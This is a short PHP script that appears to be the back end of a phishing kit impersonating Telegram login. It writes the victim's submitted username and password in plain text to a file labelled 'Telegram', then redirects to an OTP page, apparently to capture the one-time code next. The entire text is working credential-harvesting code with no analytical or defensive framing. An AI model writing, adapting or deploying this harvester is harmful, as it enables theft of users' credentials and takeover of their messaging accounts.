<?php

file_put_contents("usernames.txt", "Telegram: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.html');
exit();
?>